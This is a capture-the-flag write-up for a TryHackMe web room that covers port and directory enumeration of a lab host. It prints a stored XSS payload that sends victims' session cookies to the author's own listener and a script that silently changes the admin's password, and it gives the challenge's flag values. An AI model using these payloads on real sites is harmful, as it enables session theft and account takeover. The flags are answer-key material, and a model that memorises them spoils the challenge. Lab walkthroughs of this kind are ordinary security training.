@@ -1,0 +1,133 @@
+-------------WHAT YOUR NAME TRYHACKME --------------------------
+Date: 05-02-2025
+Link: https://tryhackme.com/room/whatsyourname
+Difficulty: Medium
+Domain: worldwap.thm
+
+
+=========Port enumeration=======
+
+#->nmapAutomator.sh --host worldwap.thm --type All
+
+---------------------Starting Script Scan-----------------------
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 7b:fe:c8:86:69:7b:f4:47:1c:ab:ae:bf:e8:2f:e0:15 (RSA)
+|   256 1d:05:29:de:32:e7:22:a4:09:b7:10:ac:c9:5e:f9:59 (ECDSA)
+|_  256 79:70:bc:61:a0:66:45:77:19:67:c6:6d:a4:b5:89:59 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-title: Welcome
+|_Requested resource was /public/html/
+8081/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+So we have 2 http port  let us see them one by one .
+
+
+
+--On the port 8081 page there is a white page so go na gobust the site. :http://worldwap.thm:8081/
+$gobuster dir -u http://worldwap.thm:8081/  -w /usr/share/wordlists/dirb/big.txt -t 100 -x .php     
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://worldwap.thm:8081/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 279]
+/.htpasswd.php        (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/.htaccess.php        (Status: 403) [Size: 279]
+/assets               (Status: 301) [Size: 320] [--> http://worldwap.thm:8081/assets/]
+/block.php            (Status: 200) [Size: 15]
+/change_password.php  (Status: 302) [Size: 4] [--> login.php]
+/chat.php             (Status: 302) [Size: 0] [--> login.php]
+/clear.php            (Status: 200) [Size: 4]
+/db.php               (Status: 200) [Size: 0]
+/index.php            (Status: 200) [Size: 70]
+/javascript           (Status: 301) [Size: 324] [--> http://worldwap.thm:8081/javascript/]
+/login.php            (Status: 200) [Size: 3108]
+/logout.php           (Status: 302) [Size: 0] [--> login.php]
+/phpmyadmin           (Status: 301) [Size: 324] [--> http://worldwap.thm:8081/phpmyadmin/]
+/profile.php          (Status: 302) [Size: 0] [--> login.php]
+/server-status        (Status: 403) [Size: 279]
+/setup.php            (Status: 200) [Size: 149]
+Progress: 40938 / 40940 (100.00%)
+===============================================================
+Finished
+========
+
+
+--On the port 80 website : http://worldwap.thm/public/html/index.php
+we are redirected there  and it have a register form : http://worldwap.thm/public/html/register.php
+After egistering myself i get a message.
+Message: You need to visit login.worldwap.thm to login once you register successfully
+
+I fixed the subdomain in my /etc/hosts file and i go to try my connexion which don't work
+
+I was triying things and i noticed that the name filed is vulnerable. so i decide to send cookie of the target to mt machine by opening a python server on my machine and register with this as the name
+
+Payload : <script>fetch('http://10.10.130.27:8000/?'+btoa(document.cookie));</script>
+
+ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.121.229 - - [06/Feb/2025 08:37:02] "GET /?UEhQU0VTU0lEPWJia2hlbTEydnRwcXV0aDR0cWwxdWFjcTFz HTTP/1.1" 200 
+
+
+Let decode  our answer
+
+PHPSESSID=bbkhem12vtpquth4tql1uacq1s
+
+When we change the cookie on login subdomain we gwt connected.
+
+
+Flag : Welcome, Moderator Flag value: ModP@wnEd    <-------
+
+
+-------------------------------------------------------------------------------------------------
+Found the seconf flag
+
+we will use this script on the admin chat 
+
+<script>
+    window.onload = function() {
+        var form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'ht'+'tP://' + 'login.worldwap.thm/change_password.php';
+        var input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'new_password';
+        input.value = 'hello';
+        form.appendChild(input);
+        document.body.appendChild(form);
+        form.submit();
+    };
+</script>
+
+
+After that we logout and login as admin and password hello
+
+Welcome, Admin Flag value: AdM!nP@wnEd
+
+
+Thank you for reading my opinion of the room @petstar from togo
+
+                                                                            
